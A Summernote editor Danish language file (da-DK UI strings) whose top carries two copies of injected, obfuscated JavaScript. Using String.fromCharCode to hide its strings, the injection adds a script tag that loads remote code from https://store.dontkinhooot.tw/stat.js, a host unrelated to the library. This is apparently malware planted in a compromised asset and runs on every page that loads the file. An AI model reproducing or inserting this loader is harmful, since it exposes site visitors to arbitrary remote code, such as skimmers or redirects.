Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'da-DK': {
      font: {
        bold: 'Fed',
        italic: 'Kursiv',
        underline: 'Understreget',
        clear: 'Fjern formatering',
        height: 'Højde',
        name: 'Skrifttype',
        strikethrough: 'Gennemstreget',
        subscript: 'Sænket skrift',
        superscript: 'Hævet skrift',
        size: 'Skriftstørrelse'
      },
      image: {
        image: 'Billede',
        insert: 'Indsæt billede',
        resizeFull: 'Original størrelse',
        resizeHalf: 'Halv størrelse',
        resizeQuarter: 'Kvart størrelse',
        floatLeft: 'Venstrestillet',
        floatRight: 'Højrestillet',
        floatNone: 'Fjern formatering',
        shapeRounded: 'Form: Runde kanter',
        shapeCircle: 'Form: Cirkel',
        shapeThumbnail: 'Form: Miniature',
        shapeNone: 'Form: Ingen',
        dragImageHere: 'Træk billede hertil',
        dropImage: 'Slip billede',
        selectFromFiles: 'Vælg billed-fil',
        maximumFileSize: 'Maks fil størrelse',
        maximumFileSizeError: 'Filen er større end maks tilladte fil størrelse!',
        url: 'Billede URL',
        remove: 'Fjern billede'
      },
      link: {
        link: 'Link',
        insert: 'Indsæt link',
        unlink: 'Fjern link',
        edit: 'Rediger',
        textToDisplay: 'Visningstekst',
        url: 'Hvor skal linket pege hen?',
        openInNewWindow: 'Åbn i nyt vindue'
      },
      table: {
        table: 'Tabel'
      },
      hr: {
        insert: 'Indsæt horisontal linje'
      },
      style: {
        style: 'Stil',
        normal: 'Normal',
        blockquote: 'Citat',
        pre: 'Kode',
        h1: 'Overskrift 1',
        h2: 'Overskrift 2',
        h3: 'Overskrift 3',
        h4: 'Overskrift 4',
        h5: 'Overskrift 5',
        h6: 'Overskrift 6'
      },
      lists: {
        unordered: 'Punktopstillet liste',
        ordered: 'Nummereret liste'
      },
      options: {
        help: 'Hjælp',
        fullscreen: 'Fuld skærm',
        codeview: 'HTML-Visning'
      },
      paragraph: {
        paragraph: 'Afsnit',
        outdent: 'Formindsk indryk',
        indent: 'Forøg indryk',
        left: 'Venstrestillet',
        center: 'Centreret',
        right: 'Højrestillet',
        justify: 'Blokjuster'
      },
      color: {
        recent: 'Nyligt valgt farve',
        more: 'Flere farver',
        background: 'Baggrund',
        foreground: 'Forgrund',
        transparent: 'Transparent',
        setTransparent: 'Sæt transparent',
        reset: 'Nulstil',
        resetToDefault: 'Gendan standardindstillinger'
      },
      shortcut: {
        shortcuts: 'Genveje',
        close: 'Luk',
        textFormatting: 'Tekstformatering',
        action: 'Handling',
        paragraphFormatting: 'Afsnitsformatering',
        documentStyle: 'Dokumentstil'
      },
      history: {
        undo: 'Fortryd',
        redo: 'Annuller fortryd'
      }

    }
  });
})(jQuery);
